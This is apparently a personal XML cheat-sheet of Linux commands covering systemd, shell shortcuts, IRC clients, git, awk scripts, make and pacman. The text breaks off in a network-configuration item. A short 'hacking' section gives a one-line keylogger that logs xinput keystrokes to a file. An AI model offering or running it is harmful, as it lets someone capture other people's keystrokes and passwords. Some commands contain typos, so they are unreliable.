<?xml version="1.0" ?><!DOCTYPE dicts [
        <!ELEMENT dict (item)>
        <!ELEMENT item (#PCDATA | command | code)*>
        <!ELEMENT command EMPTY>
        <!ELEMENT code (#PCDATA)>
        <!ATTLIST dict name CDATA #REQUIRED>
        <!ATTLIST item name CDATA #REQUIRED>
        <!ATTLIST command name CDATA #REQUIRED>
]>
<dicts>

<!--- ********************************** CODIFICA CARATTERI SPECIALI IN XML E URL***************************************** -->
<dict name="Codifica caratteri speciali in XML e URL">

<item name="codifica caratteri in XML">
Carattere	=&gt;	Corrispondente XML
&quot;		=&gt;	&amp;quot; 
&amp; 		=&gt;	&amp;amp;
&apos;		=&gt;	&amp;apos;
&lt;		=&gt;	&amp;lt;
&gt;		=&gt;	&amp;gt;


Per ulteriori caratteri andare su: http://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references
Nel caso si voglia evitare di codificare i caratteri speciali perchè si potrebbe ritenere poco leggibile il documento si può usare il costrutto CDATA

</item>

<item name="codifica caratteri in URL">

Ecco la lista dei caratteri che necessitano di una codifica particolare :
Carattere 	Codifica URL
Tabulazione 	%09
Spazio 	        %20
" 	        %22
# 	        %23
% 	        %25
&amp; 	        %26
( 	        %28
) 	        %29
+ 	        %2B
, 	        %2C
. 	        %2E
/ 	        %2F
: 	        %3A
; 	        %3B
&lt; 	        %3C
= 	        %3D
&gt; 	        %3E
? 	        %3F
@ 	        %40
[ 	        %5B
\ 	        %5C
] 	        %5D
^ 	        %5E
' 	        %60
{ 	        %7B
| 	        %7C
} 	        %7D
~ 	        %7E
</item>
</dict>

<!--- ********************************** SYSTEMD ***************************************** -->
<dict name="systemd">
    <item name="system">
        To boot the system:<command name="systemctl reboot"/>
        To poweroff the system:<command name="sudo systemctl poweroff"/>
        Analyze the boot time in msec:<command name="systemd-analyze"/>
        Ordered list of units sortex by init time:<command name="systemd-analyze blame"/>
        Plot a graph of init time:<command name="systemd-analyze plot"/>
    </item>
    <item name="system-log">
        System log:<command name="journalctl"/>
        Create a text file for the log:<command name="journalctl -a > read_log.txt"/>
        Get log a specific unit:<command name="journalctl _SYSTEMD_UNIT=systemd-logind.service"/>
    </item>
    <item name="services">
        List of services:<command name="systemctl"/>
        List of active and non active services:<command name="systemctl list-unit-files"/>
        Start a service:<command name="systemctl start service"/>
        Stop a service:<command name="systemctl stop service"/>
        Restart a service:<command name="systemctl restart service"/>
        Reload a service:<command name="sudo systemctl reload service"/>
        Show the status of a service:<command name="systemctl status service"/>
        Enable a service at boot:<command name="systemctl enable service"/>
        Disable a service at boot:<command name="systemctl disable service"/>
        Check whether a service is disabled:<command name="systemctl is-enabled service; echo $?"/>
    </item>
</dict>


<!--- ********************************** BASH SHORTCUTS ***************************************** -->
<dict name="bash shortcuts">
    <item name="bash shortcuts">
Ctrl-a          Move to the start of the line.
Ctrl-e          Move to the end of the line.
Ctrl-b          Move back one character.
Alt-b           Move back one word.
Ctrl-f          Move forward one character.
Alt-f           Move forward one word.
Ctrl-] x        Where x is any character, moves the cursor forward to the next occurance of x.
Alt-Ctrl-] x    Where x is any character, moves the cursor backwards to the previous occurance of x.
Ctrl-u          Delete from the cursor to the beginning of the line.
Ctrl-k          Delete from the cursor to the end of the line.
Ctrl-w          Delete from the cursor to the start of the word.
Esc-Del         Delete previous word (may not work, instead try Esc followed by Backspace)
Ctrl-y          Pastes text from the clipboard.
Ctrl-l          Clear the screen leaving the current line at the top of the screen.
Ctrl-x Ctrl-u   Undo the last changes. Ctrl-_ does the same
Alt-r           Undo all changes to the line.
Alt-Ctrl-e      Expand command line.
Ctrl-r          Incremental reverse search of history.
Alt-p           Non-incremental reverse search of history.
!!              Execute last command in history
!abc            Execute last command in history beginning with abc
!abc:p          Print last command in history beginning with abc
!n              Execute nth command in history
!$              Last argument of last command
!^              First argument of last command
^abc^xyz        Replace first occurance of abc with xyz in last command and execute it
    </item>
</dict>

<!--- ********************************** MULTIMEDIA IMAGE VIDEO MUSIC ***************************************** -->
<dict name="Multimedia image video music">
    <item name="screenshot - scrot ">
        To grab a shot with 5sec delay:<command name="scrot -c -d 5"/>
        To select the region of the screen:<command name="scrot -c -s -d 5"/>
    </item>
</dict>
<!--- ******************************* IRC and IRSSI  ******************************** -->
<dict name="irc irssi">
    <item name="basic commands">
        To connect to a server:<command name="/connect irc.freenode.net"/>
        or:<command name="/server irc.freenode.net"/>
        You can use Ctrl-X to switch between network connections.
        To join a channel:<command name="/join #mychan"/>
        To list all the channel:<command name="/list"/>
        To close the session irc client:<command name="/quit"/>

List of main commands:

Command     Alias     Info
/ban        /bans,/b  Sets or List bans for a channel
/clear      /c, /cl   Clears a channel buffer
/join       /j        Joins a channel
/kick       /k        Kicks a user
/kickban    /kb       Kickban a user
/msg        /m        Send a private message to a user
/unban *    /mub      Clears the unbanlist (unbans everyone) in a channel
/names      /n        Lists the users in the current channel
/query      /q        Open a query window with a user, or close current query window
/topic      /t        Displays/edits current topic. Tip: use /t[space][tab] to automatically fill in existing topic.
/window close   /wc     Force closure of a window.
/whois  /wi     WHOIS a user. Displays user information 

    </item>
    <item name="miscellaneous">
        To get the property:<command name="/set"/>
        To set a property:<command name="/set timestamp_format %H:%M:%S"/>
        To save the configuration:<command name="/save"/>
        To get all the alias:<command name="/alias"/>
        To set a theme:<command name="/set theme themename"/>
        To highlight some nick:<command name="/hilight yournick"/>
    </item>

    <item name="perl script">
        Put the script in ~/.irssi/scripts or in ~/.irssi/scripts/autorun to run the script at startup.
        To execute a script:<command name="/run scriptname"/>
    </item>

    <item name="set a new account">
        To set a nick:<command name="/nick feel"/>
        To register the nick:<command name="/msg nickserv register password user@email"/>
        To beingidentified with your own account:<command name="/msg nickserv register password"/>
        To change the password:<command name="/ns set password newPassword"/>
    </item>

    <item name="chatting">
        To a private chat:<command name="/query nick"/>
    </item>

</dict>

<!--- ******************************* AT  ******************************** -->
<dict name="at">
    <item name="general commands">
        I comandi sono at, batch, atq, e atrm:
          *  at esegue i comandi in un momento specificato.
          *  atq elenca i lavori in attesa dell’utente, a meno che l’utente non sia il superutente;
             in tal caso, tutti i lavori sono elencati.
          *  atrm elimina uno dei lavori in attesa, identificati dal loro numero.
          *  batch esegue comandi quando permesso dal livello di carico del sistema,
             in altre parole, quando il carico medio scende sotto 1.5,
             o il valore specificato nella chiamata di atd
    </item>

    <item name="at">
        To execute at script.sh at 20.00 send an email of the output and insert the job into the queue a:<command name="at -m -q a -f script.sh 20.00"/>
        Other possible values of time are &quot;midnight Friday&quot;
    </item>
    <item name="other command atrm, atq">
        To see the list of jobs:<command name="atq"/>
        To see the detail of the job number 3:<command name="at -c 3"/>
        To remove the job number 3:<command name="atrm 3"/>
    </item>

</dict>

<!--- ******************************* BITLBEE  ******************************** -->
<dict name="bitlbee">
    <item name="help">
        General index:<command name="help index"/>
    </item>

    <item name="first step">
        To register your own account:<command name="register &lt;password>"/>
        Add a gmail account:<command name="account set jabber username@gmail.com password"/>
        To see the setting related to this account:<command name="acc gtalk set"/>
        Then set the "server","port" and "ssl" property accordingly.
        Add a facebook account:<command name="account add jabber user@chat.facebook.com"/>
        and enable it:<command name="account fb set oauth on"/>
    </item>
    <item name="manage accounts and user">
        List the accounts:<command name="account list"/>
        To set server property:<command name="account 0 set server talk.google.com"/>
        To set username:<command name="account 0 set username foo@gmail.com"/>
        To connect with an account:<command name="account 0 on"/>
        To disconnect:<command name="account gtalk off"/>
        To delete an account:<command name="account 0 del"/>
        To see all the properties of an account:<command name="account 0 set"/>

        To see all the properties of a user:<command name="set"/>
    </item>

    <item name="chatting">
        To add some contacts:<command name="add 0 r2d2@example.com"/>
        To remove:<command name="remove r2d2"/>
        To rename:<command name="rename r2d3 r2d2"/>
        To chat in separate window:<command name="/msg or /query"/>
        
        More features:
        To join in a new separate channel:<command name="/join &amp;msn"/>
    </item>
</dict>




<!--- ********************************** GIT ***************************************** -->
<dict name="git">
    <item name="config">
        To set user information:
        <command name="git config --global user.name &quot;John Doe&quot;"/>
        <command name="git config --global user.email johndoe@example.com"/>
        To set editor:<command name="git config --global core.editor emacs"/>
        To set diff editor:<command name="git config --global merge.tool vimdiff"/>
        To set color:<command name="git config color.diff auto"/>

        To check config:<command name="git config --list"/>
    </item>
    <item name="init a project">
        Existing project:<command name="git init"/>
        Cloning project:<command name="git clone git://github.com/schacon/grit.git"/>
        To create a repository without a working directory: <command name="git init --bare --shared myproject.git"/>
        To clone a repository without a working directory: <command name="git init --bare --shared remoterepo myproject.git"/>
        The last two commands above are useful for a shared repository.
    </item>
    <item name="fundamental commands">
        To track a file in git or to stage a file to be candidate for a commit:<command name="git add file"/>
        Note: Every time you change a file it will not be in a stage area and to get the last changes in stage you have to retype
        git add on that file.
        The interctive tool for manage untracked or unstaged files:<command name="git add -i"/>
        <command name="git mv fileold filenew"/>
        <command name="git status"/>
        To commit and skip the staged phase:<command name="git commit -am 'message'"/>

        To remove file:<command name="git rm file"/>
        To remove from the tracker but not from disk:<command name="git rm --cached file"/>

        To see what you’ve changed but not yet staged:<command name="git diff"/>
        To compares your staged changes to your last commit:<command name="git diff --staged"/>
        To show the diff and log message of a commit/branch or whatever object:<command name="git show name_object"/>


        To take track of your past commit:<command name="git log"/>
        And using diff too of the last one:<command name="git log -p -1"/>
        To use the graph:<command name="git log --graph"/>
        To get statistics:<command name="git log --stat"/>
        For a concise list of commits:<command name="git log --pretty=oneline"/>
        To log only a branch but not the commit of master:<command name="git log name_branch --not master"/>
        For a detailed use of log see:http://progit.org/book/ch2-3.html
    </item>

    <item name="ignoring files">
        Just create a file .gitignore like this:
        <code>
            # a comment - this is ignored
            *.a       # no .a files
            !lib.a    # but do track lib.a, even though you're ignoring .a files above
            /TODO     # only ignore the root TODO file, not subdir/TODO
            build/    # ignore all files in the build/ directory
            doc/*.txt # ignore doc/notes.txt, but not doc/server/arch.txt
        </code>
    </item>
    <item name="undoing things">
        To replace a commit with another
        (because you forgot to add somethings in your message):
        <command name="git commit --amend"/>

        To unstaging a staged file:
        <command name="git reset HEAD file"/>

        Unmodify a modified file up to the last commit:<command name="git checkout -- file.rb"/>
    </item>
    <item name="other stuffs">
        To create an alias:<command name="git config --global alias.co checkout"/>
        So, you can type:<command name="git co"/>
        To run an external command with alias:<command name="git config --global alias.visual &quot;!gitk&quot;"/>
        There are two important gui tools (do not forget to install tk package first):<command name="gtk gui; gitk"/>
    </item>
    <item name="working with remote">
        To know the remotes:<command name="git remote -v"/>
        To add a remote repository:<command name="git remote add [shortname] [url]"/>
        To get data from a remote repo (but it don't merge):<command name="git fetch [shortname]"/>
        To fetch a specific branch and merge it into your current local branch:<command name="git pull (remote) (branchname)"/>

        To push a local branch to remote repo:<command name="git push (remote) (branch)"/>
        For example:<command name="git push origin master"/>
        If you want to change the name of the remote branch:<comand name="git push origin serverfix:awesomebranch"/>
        Note: This command works only if you cloned and if nobody has pushed in the meantime.

        To see info about a remote:<command name="git remote show origin"/>

        To remove a remote:<command name="git remote rm dav"/>
        To rename a remote:<command name="git remote rename joe feel"/>
    </item>
    <item name="tagging and archive">
        List available tags:<command name="git tag"/>
        To look for some tags:<command name="git tag -l 'v1.4.2.*'"/>
        
        To create an annotated tag:<command name="git tag -a v1.2.0 -m 'my version'"/>
        To create a Lightweight Tags:<command name="git tag v1.4.2-lw"/>
        To create and sign a tag with you private key:<command name="git tag -s "/>
        To verify sign of a tag:<command name="git tag -v v1.4.2"/>
        To show information about the tag:<command name="git show v1.4.2"/>

        To add tag to past commit:<command name="git tag -a v1.3 [checksum]"/>
        You can see the checksum typing log command.

        To transfer to remote a tag:<command name="git push v1.2"/>
        To transfer to remote all tags:<command name="git push --tags"/>

        To give a unique and human readable release number to the current commit:<command name="git describe master"/>
        To create an archive:<command name="git archive master | gzip > `git describe master`.tar.gz"/>

        Example of Changelog:
        <command name="git shortlog 0.18.1...0.17.5 --no-merges"/>
        <command name="git log 0.18.1...0.17.5 --no-merges --pretty=format:&quot;%ci %an &lt;%ae&gt;%n    * %s&quot; | awk 'BEGIN{ldate=0}{msg=$0; if((NR-1)%2==0){msg=$1; for(i=4;i&lt;=NF;i++)msg=msg&quot; &quot;$i;} if($1!=ldate){print msg}; if((NR-1)%2==0){ldate=$1}}'"/>
    </item>

    <item name="branching and merge">
        To create a branch:<command name="git branch new_branch"/>
        HEAD is a pointer to the current active branch.
        To switch between branchs:<command name="git checkout other_branch"/>
        To create and switch at the same time:<command name="git checkout -b n_branch"/>

        To merge back into the master commit starting from another branch:
            Switch:<command name="git checkout master"/>
            Merge:<command name="git merge hotfix"/>

        To manage merging conflicts with a graphical tool:<command name="git mergetool"/>
        To delete a branch:<command name="git branch -d hotfix"/>
        To see the last commit on each branch:<command name="git branch -v"/>
        To see merged or no-merged branchs:<command name="git branch [--merged|--no-merged]"/>
        To move/rename a branch:<command name="git branch -m oldbranch newbranch"/>

        WITH REMOTE:
        To get changes from a remote you can do two things (after doing "remote add" command):
        *    Fetch and then merge the current local branch:
        *    Create a new branch from the remote one:<command name="git checkout -b local_branch remote/remote_branch"/>
        To delete a remote branch:<command name="git push origin :remote_branch"/>
        To create/rename another branch from local to remote:
        <command name="git push origin local_branch:remote_branch"/>

        The local branch will automatically push to and pull from remote/remote_branch:
        <command name="git checkout --track remote/remote_branch"/>
        <command name="git checkout -b local_branch remote/remote_branch"/>
    </item>

    <item name="deploying using git on server">
        The best way is create a working directory on remote sever.
        SERVER SIDE
        To disable the control from git: 
        <command name="git config --global receive.denyCurrentBranch ignore"/>
        Create a work tree:
        <command name="git init"/>
        Create the hook:
        <command name="touch .git/hooks/post-receive"/>
        Write the following:
        <code>
            #!/bin/sh
            cd ..
            GIT_DIR='.git'
            umask 002 &amp;&amp; git reset --hard
        </code>
        Exec permissions:
        <command name="chmod a+x .git/hooks/post-receive"/>

        CLIENT SIDE:
        Add the remote:
        <command name="git remote add production user@ssh.domain.com:~/my_project/.git"/>
    </item>

    <item name="Contributing to a project">
        To check whitespaces before commiting:<command name="git diff --check"/>
        Before pushing to the remote is important to remember the following steps:
        1) fetch the changes in order to get the remote (usually origin/master) up to date
        locally:<command name="git fetch orign"/>
        2) merge the two versions(master and origin/master).
        You need to be in the master branch:<command name="git merge origin/master"/>
        3) Push the new snapshot in remote:<command name="git push orign master"/>

        To check what commits are needed to merge use:<command name="git log --no-merges"/>

        To request pull from a remote public repo:<command name="git request-pull origin/master myfork"/>
        
        MANAGE PATCHES:
        Create a Patch:
        From your commits it is possible to create a patch:<command name="git format-patch -M origin/master"/>
        Send email with patches (first use git config to set the email account):<command name="git send-email *.patch"/>

        Apply a patch:
        For applying a new patch is a good practice to create a temporary branch first.
        To apply a patch that come from git diff or diff commands:<command name="git apply name_patch.patch"/>
        Before apply it is good idea to check first:<command name="git apply --check name_patch.patch"/>

        To apply a patch from format-patch(it is the best way):<command name="git am name_patch.patch"/>
        In case of error you can edit the conflict file and type:<command name="git am --resolved"/>
        Or in case of abort of skip:<command name="git am --skip"/><command name="git am --abort"/>

        If the patch doesn't work, it is possible to apply using a three-way merge:<command name="git am -3 name_patch.patch"/>
        The interactive mode is:<command name="git am -i name_patch.patch"/>

        DETERMINE THE DIFFERENCES:
        It is important to know that using the classic:<command name="git diff master"/> is not always a good idea,
        in particular when the branches diverges a lot.
        To see truly the difference we need to find the common ancestor:<command name="git merge-base name_branch master"/>
        and later use that ancestor to diff:<command name="git diff 367cd"/>
        Git provides an awesome command to do that directly!<command name="git diff name_branch...master"/>
    </item>

    <item name="miscelaneous to be a git master!">
        To get the commit from the branch name:<command name="git rev-parse branch_name"/>
        REFLOG:
        Git records all the operations done in a history:<command name="git reflog"/>
        To show what is going on yesterday on master:<command name="git show master@{yesterday}"/>
        And two months ago on HEAD:<command name="git show HEAD@{2.months.ago}"/>

        ANCESTRY REFS:
        There are two specification ^ or ~. ^ is used to traverse ancestors with more than one parent
        and ~ is used to traverse depth in the history.
        To get the second parent:<command name="git show HEAD^2"/> or <command name="git show HEAD^^"/>
        To get the grandparent:<command name="git shoe HEAD~2"/>

        COMMIT RANGES:
        What is in experiment branch that hasn’t yet been merged into master branch?<command name="git show master..experiment"/>
        Or to get a log for the commits that has to be merged in a remote:<command name="git log origin/master..HEAD"/>
        To get the commits that are reachable by either of two references but not by both of them showing the sides too:
        <command name="git log --left-right master...experiment"/>

        DETECT BUGGY COMMITS:
        In case of having hundreds of commits in order to detect a buggy commit:
        1) Start the binary search algorithm:<command name="git bisect start"/>
        2) Specify that the current commit is buggy:<command name="git bisect bad"/>
        3) Specify the last known good commit:<command name="git bisect good v1.0"/>
        bisect start to evaluate the middle commits and after you test the commit,
        you can judge the commit as bad o good:<command name="git bisect good/bad"/>
        Until you get the first bad commit.
        To reset the HEAD to the original commit:<command name="git bisect reset"/>

        If you have a script that return zero in case the commit is good and non-zero otherwise,
        you can easily automate as follows:
        1) Indicate the good and bad commit:<command name="git bisect start HEAD v1.0"/>
        2) Run the process:<command name="git bisect run test-error.sh"/>
        bisect continue until finds the first broken commit.

        BUG ANNOTATION:
        If you detect a bug and want to know when it was introduced and why:
        <command name="git blame -L 12,22 name_file"/>
        To check also if the file was renamed and so on:<command name="git blame -C -L 143,160 file_name"/>

        REWRITNG THE HISTORY:
        In order to split, merge, change multiple messages in previous commit see
        http://git-scm.com/book/en/Git-Tools-Rewriting-History

    </item>

    <item name="stashing">
        Stashing is useful when you have started a work that you still don't want to commit but you have also to switch branch.
        To store the changes:<command name="git stash"/>
        To list the stashs:<command name="git stash list"/>
        To apply a stash:<command name="git stash apply stash@{1}"/>
        Even better apply and delete a stash:<command name="git stash pop stash@{1}"/>
        To drop a stash:<command name="git drop stash@{1}"/>
        To show the diff:<command name="git stash show -p stash@{1}"/>
        After changes it is possible to unapply the work from a stash:<command name="git stash show -p stash@{0} | git apply -R"/>
        To create a branch from a stash:<command name="git stash branch branch_name"/>
    </item>
</dict>



<!--- ********************************** GREP SED PASTE & AWK ***************************************** -->
<dict name="Grep Sed Paste &amp; Awk">
    <item name="grep '\&lt; [a-z0-9-]\+\&gt;' doc.txt">
        ricerca su un file dati. -i ignora il case, -m &quot;num&quot; num massimo di abbinamenti, -n stampa il numero della linea, -f=&quot;FILE&quot; per specificare che il Pattern si trova in File, --colour per il colore. per comandi avanzati sed oppure awk(molto difficile)

        To invert match:<command name="grep -v python f.txt"/>
        To check an exact match:<command name="grep -x python.* f.txt"/>
    </item>
    <item name="paste">
        Merge lines of files delimited by a space char:<command name="paste -s -d ' ' file.txt"/>
    </item>
    <item name="sed">
        The delimiters can be: @:,;% instead of / if we want.
        *  Substitution
            Apply all occurences (because of g) of two substitutions:<command name="sed -e 's/dog/cat/g' -e 's/cat/elephant/g' file"/>
            The substitution is only applied to lines matching the regular expression "not":<command name="sed -e '/not/s/black/white/g' file"/>
            It matches the regular expression ^line.*one:<command name="sed -e '/^line.*one/s/line/LINE/' file"/>

        *  Delete
            The lines are deleted if they match with the regular expression "line":<command name="sed -e '/line/d' file"/>
            Delete the first and second line:<command name="sed -e '1,2d' file"/>
            Delete the line from the first match with "hello" to the line that matches with "goodbye":<command name="sed -e '/hello/,/goodbye/d' file"/>
    </item>

    <item name="awk">
        Basic syntax is "pattern {action}".
        BEGIN and END specify the action to apply before and after process each line of stdin:
        <command name="awk 'BEGIN { print &quot;File\tOwner&quot;} { print $8, &quot;\t&quot;, $3} END{ print &quot;DONE&quot; }'"/>
        The option -v specify a variable:<command name="awk -v q=0 'BEGIN{} $1==q {print $0 }END{}'"/>

        The built-in variables are:
        *   NR -- The current line's sequential number
        *   NF -- The number of fields in the current line
        *   FS -- The input field separator; defaults to whitespace and is reset by the -F command line parameter 
        *   RS -- The record separator; by default is newline
        *   OFS -- The output field separator; default is space. See example below
        *   FILENAME -- name of the file (see below for an example to use it for joining two files!)
        *   FNR -- same as NR but with multiple files it restart counting from 1 for each file while NR continue incrementing

        Variables don't need dollar char!
        Example:<command name="awk '{print $1,NF,NR,FS }'"/>
        
        Print if $1 begin with J:<command name="awk '($1~/^J/) { print $1 }'"/>
        To use several separator (it's also possible to change it at runtime using FS):<command name="awk -F &quot;[,;.]&quot; '{print $4}'"/>
        Print if the lenght of $1 is greater than 6:<command name="awk '(length($2)>6) {print $2}'"/>
        Count number of lines where col3 &gt; col1:<command name="awk '$3 > $1 {print i + &quot;1&quot;; i++}'"/>
        Print the maximum value: <command name="awk 'BEGIN{} $1>x {x=$1} END{print x}'"/>
        To delete all words ending with a letter g:<command name="awk '{gsub(&quot;[a-zA-Z0-9]*[g|G]&quot;, &quot;&quot;);print}' input"/>

        To change the record separator: <command name="echo &quot;mela pera; cane gatto; Milano bari&quot; | awk 'BEGIN { RS=&quot;;&quot; } {print NR}'"/>
        Use another output field separator:<command name="echo &quot;banane;pere;ciliegie;fragole&quot; | awk -F&quot;;&quot; 'BEGIN { OFS=&quot;_&quot; } {print $1,$2,$3}'"/>
        Null char output separator. USEFUL in order to use pipe with xargs -0:<command name="echo &quot;berry,banana,pineapple,apple&quot; | awk 'BEGIN{RS=&quot;,&quot;} {printf &quot;%s\000&quot;,$1}'"/>
        Null char input separator:<command name="du -0 -b | awk 'BEGIN{RS=&quot;\x00&quot;}{print $0}'"/>
        Traspose a column into row:<command name="echo -e &quot;a\nb\nc\n&quot; | awk 'BEGIN {RS=&quot;\n&quot;; ORS=&quot; &quot;;print &quot;\n&quot;}  {print $0} END{print &quot;\n\n&quot;}'"/>
        Use of arrays:<command name="$ awk 'BEGIN{ortolano[&quot;banana&quot;]=20; print ortolano[&quot;banana&quot;]}'"/>
Examples:
        <code>
#!/usr/bin/awk -f
#calcolare la media dei voti con relativi giudizi.
BEGIN {
    print "     \fESITO DELLE PROVE\n"
    print " \fNome\tMedia\tGiudizio\n";
}
{
    totale=$2+$3+$4+$5+$6;
    media=totale/5
    if (media>18) {giudizio="promosso";}
    else if (media&lt;18) {giudizio="respinto";}
    print $1,media,"=>",giudizio;
}
END {
    print "------------------------"
    }</code>


<code>#!/usr/bin/awk -f
BEGIN {
    count1=0
    count2=0
    print "\fRISULTATI STATISTICI"         
}
#conto i candidati promossi
$4 ~ /promosso/ {count1++}
#conto i candidati respinti
$4 ~ /respinto/ {count2++}
#calcolo la percentuale dei promossi
{promossi=(count1/NR)*100}
#calcolo la percentuale dei respinti
{respinti=(count2/NR)*100}
#calcolo il punteggio medio tra tutti i candidati
{media+=$2/9}
END {
    print "\fnumero candidati:", NR
    print "numero dei promossi:", count1
    print "percentuale dei promossi", promossi "%"
    print "numero dei respinti", count2
    print "percentuale dei respinti:", respinti "%"
    print "punteggio medio di tutti i candidati:", media
    print ".........................."
}</code>

<code>
    #!/usr/bin/awk -f
    # Count word,rows and chars in a file
    {
     nc += length($0); np += NF
    }
    END { print "Il file",FILENAME " contiene:", NR " righe,", np " parole,", nc " caratteri."
    }
</code>


<code>
#!/usr/bin/awk -f
BEGIN {
  print " \f##########RETRIBUZIONE TOTALE###########\n"
}
{
  i=2; totale=0
  while (i&lt;=NF) {
    totale=totale+$i;
    i++
  }
  print "\nil Signor",$1, "in sette mesi ha guadagnato", totale, "euro"
}
</code>

<code>
#!/usr/bin/awk -f

# Example of arrays

BEGIN {
  print "\n\n"
  #L'array geo ha come chiavi tre Stati e, come valori, le rispettive capitali.
  geo["Francia"] = "Parigi"
  geo["Angola"] = "Luanda"
  geo["Bhutan"] = "Thimphu"
  for (i in geo) {
    printf "%8s %06s\n", i, geo[i] #su printf ci ritorneremo
  }
  # Eliminiamo la chiave "Francia" con il comando delete.
  print "\n\n"
  delete geo["Francia"]
  for (i in geo) {
    print i, geo[i] #Controlliamo se ha eliminato la chiave Francia col suo relativo valore.
  }
  # cerca se la chiave Francia esiste
  print "\n\n"
  print "Francia " ( "Francia" in geo )   #Dà 0, la chiave Francia non esiste
  print "Bhutan " ( "Bhutan" in geo )"\n"  #Dà 1, la chiave Bhutan esiste
}
</code>

<code>
# Example of using two files doing a joing in one table!
#!/usr/bin/awk -f

BEGIN { 
         print "\n\t.............START....................\n"
         FORMAT="\t%-12s%-12s%-8s%s\n"
         printf FORMAT,"ALUNNI","MATRICOLE","VOTI","MATERIE"
  }
   {  
          if (FILENAME == "tabella1.txt") {
               matricole[$1] = $2
          }
          if (FILENAME == "tabella2.txt") {
              printf FORMAT, $1,matricole[$1],$2,$3 
          }
   }
END {
print "\n\t.................END..................\n"
}
</code>

    </item>

</dict>

<!--- ********************************** MAKE ***************************************** -->
<dict name="MAKE">

<item name="make">
Una opzione di make e' -f che consente di specificare il Makefile da utilizzare:<command name="make -f Mafile-1"/>
Un Makefile ha una struttura del genere:
<code>
<![CDATA[
target: dependencies
[tab]   compilation command
]]>
</code>

Special variables are:
$^     -> Prerequisites of the rule
$&lt;  -> First prerequisite
$@     -> The target of the rule
$?     -> All out-of-data prerequisites

To include makefiles inside the same makefile we can use:
include &lt;config.mk&gt;

Ecco un esempio in cui si vede il contenuto di un Makefile
<code>
<![CDATA[
# This is a comment. The variable CC will be the compiler to use.
CC=g++
# CFLAGS will be the options I'll pass to the compiler.
CFLAGS=-c -Wall

all: hello

hello: main.o factorial.o hello.o
	$(CC) main.o factorial.o hello.o -o hello

main.o: main.cpp
	$(CC) $(CFLAGS) main.cpp

clean:
	rm -rf *o hello
]]>
</code>
Un esempio ancora più generale è il seguente:
<code>
<![CDATA[
CC=g++
CFLAGS=-c -Wall
LDFLAGS=
SOURCES=main.cpp hello.cpp factorial.cpp
OBJECTS=$(SOURCES:.cpp=.o)
EXECUTABLE=hello

all: $(SOURCES) $(EXECUTABLE)
	
$(EXECUTABLE): $(OBJECTS) 
	$(CC) $(LDFLAGS) $(OBJECTS) -o $@

.cpp.o:
	$(CC) $(CFLAGS) $< -o $@
]]>
</code>
</item>
</dict>

<!--- ********************************* HACKING ***************************************** -->
<dict name="hacking">
    <item name="keylogger with xinput">
        To grab the output into a file:<command name="script -c &quot;xinput test ID&quot; | cat /tmp/key.log"/>
        To get the ID of the keyboard type:<command name="xinput --list"/>
    </item>
</dict>



<!--- ********************************* PACMAN MAKEPKG ***************************************** -->
<dict name="pacman and makepkg">
    <item name="pacman">
        To install package:<command name="pacman -S pack"/>
        Download a package without install it:<command name="pacman -Sw pack"/>

        To install a package from file:<command name="pacman -U file.pkg.tar.xz or http://file.pkg.tar.xz"/>

        To remove package:<command name="pacman -R pack"/>
        To remove package and its dipendencies:<command name="pacman -Rs pack"/>
        To remove package and its dipendencies and config files:<command name="pacman -Rns pack"/>

        To upgrade with the repository:<command name="pacman -Syu"/>
        If you don't want to upgrade a particular package:<command name="pacman -Syu --ignore linux"/>

        To search in the database repository (both name and description):<command name="pacman -Ss string"/>
            to display extensive information:<command name="pacman -Si pack"/>


        To search in already installed package:<command name="pacman -Qs string"/>
            to display extensive information:<command name="pacman -Qi pack"/>
            to list all the files installed by a package:<command name="pacman -Ql pack"/>

        To know the list of packages explictly installed:<command name="pacman -Qeq"/>
        To know the whole list od packages installed:<command name="pacman -Qq"/>

        To know which package a file belongs to:<command name="pacman -Qo path/to/file"/>

        To list all the packages orphans:<command name="pacman -Qdt"/>
        To remove recursively all the orphans:<command name="pacman -Rs $(pacman -Qtdq)"/>

        Clean the package cache (/var/cache/pacman/pkg/) of packages that are not
        currently installed.
        Useful to do periodically:<command name="pacman -Sc"/>
    </item>

    <item name="makepkg">
        To clean up the folder:<command name="makepkg -c"/>
        To install needed dependencies automatically:<command name="makepkg -s"/>
    </item>
    <item name="install package from aur">
        Installing packages from the AUR (aka the [unsupported] repository) is a relatively simple process. Essentially:

           1. Acquire the tarball which contains the PKGBUILD and possibly other required files
           2. Extract the tarball (preferably in a folder set aside just for builds from the AUR)
           3. Run makepkg in the directory where the files are saved ("makepkg -s" will auto-resolve dependencies with pacman)
           4. Install the resulting package with pacman -U

    </item>
    <item name="local repository repo-add repo-remove">
        1. Create a directory of repository:<command name="mkdir /home/feel/repo"/>
        2. Make a repository:<command name="repo-add custom.db.tar.gz *.pkg.tar.gz"/>
        3. In file pacman.conf put:
        <code>
            [custom]
            Server = /home/feel/repo
        </code>
        4. Upgrade:<command name="pacman -Syu"/>
    </item>

    <item name="Backing up and retrieving a list of installed packages">
        Get the list of installed packages:<command name="comm -23 &lt;(pacman -Qeq) &lt;(pacman -Qmq) > pkglist"/>
        Restore:<command name="sudo pacman -S $(&lt; pkglist)"/>

        Look https://wiki.archlinux.org/index.php/Pacman_Tips#Custom_local_repository for more details.

    </item>
</dict>

<!--- ********************************* Netcfg, network daemons and automatic connection  ***************************************** -->
<dict name="netcfg, network daemons and automatic connection">
    <item name="netcfg">
        1. Define a network in /etc/network.d/ called mynetwork (copy one of the examples in the examples directory)
        2. Connection:<command name="netcfg mynetwork"/>
        3. Disconnection:<command name="netcfg down mynetwork"/>
        4. To Access at the menu any time (require dialog package):<command name="netcfg-menu"/>
    </item>
    <item name="automatic connection">
        You need to install the following package:
        * wpa_actiond - for automatic/roaming wireless connection
        * ifplugd - for automatic ethernet connection
        
        To connect profile during boot:
        1. Edit /etc/rc.conf
            NETWORKS=(mynetwork yournetwork)
            DAEMONS=(... net-profiles ...)
        
        To connect to wireless networks with roaming support:
        1. Edit /etc/rc.conf
            WIRELESS_INTERFACE="wlan0"
            DAEMONS=(... net-auto-wireless ...)

        To connect to wired networks:
        1. edit /etc/rc.conf
            WIRED_INTERFACE="eth0"
            DAEMONS=(... net-auto-wired ...)
    </item>
    <item name="network">
        Use /etc/rc.conf to configure the network (interfaces, dhcp or static ip, gateway, etc...)
        To restart the daemon:<command name="/etc/rc.d/network restart"/>
    </item>
    <item name="Create a daemon to change mac">
        1. Create a script set-hw-addr in /etc/rc.d/
        2. In rc.conf put it prior to network daemon:
        DAEMONS=(... set-hw-addr network ...)
